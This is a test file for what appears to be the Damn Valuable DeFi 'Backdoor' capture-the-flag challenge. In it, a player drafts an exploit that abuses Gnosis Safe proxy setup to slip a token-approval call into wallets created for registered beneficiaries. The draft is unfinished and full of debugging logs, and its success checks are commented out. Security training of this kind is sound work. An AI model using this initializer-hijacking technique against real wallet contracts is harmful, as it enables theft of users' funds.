const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
  let deployer, users, player;
  let masterCopy, walletFactory, token, walletRegistry;

  const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address];

    // Deploy Gnosis Safe master copy and factory contracts
    masterCopy = await (
      await ethers.getContractFactory('GnosisSafe', deployer)
    ).deploy();
    walletFactory = await (
      await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)
    ).deploy();
    token = await (
      await ethers.getContractFactory('DamnValuableToken', deployer)
    ).deploy();

    // Deploy the registry
    walletRegistry = await (
      await ethers.getContractFactory('WalletRegistry', deployer)
    ).deploy(masterCopy.address, walletFactory.address, token.address, users);
    expect(await walletRegistry.owner()).to.eq(deployer.address);

    for (let i = 0; i < users.length; i++) {
      // Users are registered as beneficiaries
      expect(await walletRegistry.beneficiaries(users[i])).to.be.true;

      // User cannot add beneficiaries
      await expect(
        walletRegistry
          .connect(await ethers.getSigner(users[i]))
          .addBeneficiary(users[i])
      ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
    }

    // Transfer tokens to be distributed to the registry
    await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
  });

  it('Execution', async function () {
    const saltNonce = 42;
    const abiSafe = [
      'function setup(address[],uint256,address,bytes,address,address,uint256,address)',
    ];
    const ifaceSafe = new ethers.utils.Interface(abiSafe);

    const abiToken = ['function approve(address, uint256)'];
    const ifaceToken = new ethers.utils.Interface(abiToken);
    const approveToken = ifaceToken.encodeFunctionData('approve', [
      player.address,
      10n * 10n ** 18n,
    ]);

    for (let i = 0; i < users.length; i++) {
      const owners = [users[i]];
      const threshold = 1;

      // HERE WALLET FACTORY TRIGGERS THE APPROVAL,
      // IT SHOULD BE THE NEW WALLET!


      const initializer = ifaceSafe.encodeFunctionData('setup', [
        owners,
        threshold,
        token.address,
        approveToken,
        ethers.constants.AddressZero,
        ethers.constants.AddressZero,
        0,
        ethers.constants.AddressZero,
      ]);

      const tx = await walletFactory.createProxyWithCallback(
        masterCopy.address,
        initializer,
        saltNonce,
        walletRegistry.address
      )
      const receipt = await tx.wait();
      
      console.log(receipt.logs);

      const proxyCreatedLog = receipt.logs.find(log => log.topics.length === 3);
      if (!proxyCreatedLog) {
        console.error("Proxy creation log not found");
        continue;
      }

      // console.log('proxyCreatedLog', proxyCreatedLog)

      // const newWalletAddress = proxyCreatedLog.address;

      console.log(await token.balanceOf(walletFactory.address))

      // const allowance = await token.allowance(newWalletAddress, player.address);
      // // console.log('allowance:', allowance);

      // console.log('newWalletAddress', newWalletAddress)
      console.log('____________________________________________________________-');
    }
    
    // const allowance = await token.allowance(walletFactory.address, player.address);
    // console.log('allowance:', allowance);

    console.log('player', player.address)
    console.log('token', token.address)
    console.log('walletFactory', walletFactory.address)

    console.log('alice', alice.address)
    console.log('bob', bob.address)
    console.log('charlie', charlie.address)
    console.log('david', david.address)
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player must have used a single transaction
    // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
    // for (let i = 0; i < users.length; i++) {
    //     let wallet = await walletRegistry.wallets(users[i]);
    //     // User must have registered a wallet
    //     expect(wallet).to.not.eq(
    //         ethers.constants.AddressZero,
    //         'User did not register a wallet'
    //     );
    //     // User is no longer registered as a beneficiary
    //     expect(
    //         await walletRegistry.beneficiaries(users[i])
    //     ).to.be.false;
    // }
    // Player must own all tokens
    // expect(
    //     await token.balanceOf(player.address)
    // ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
  });
});
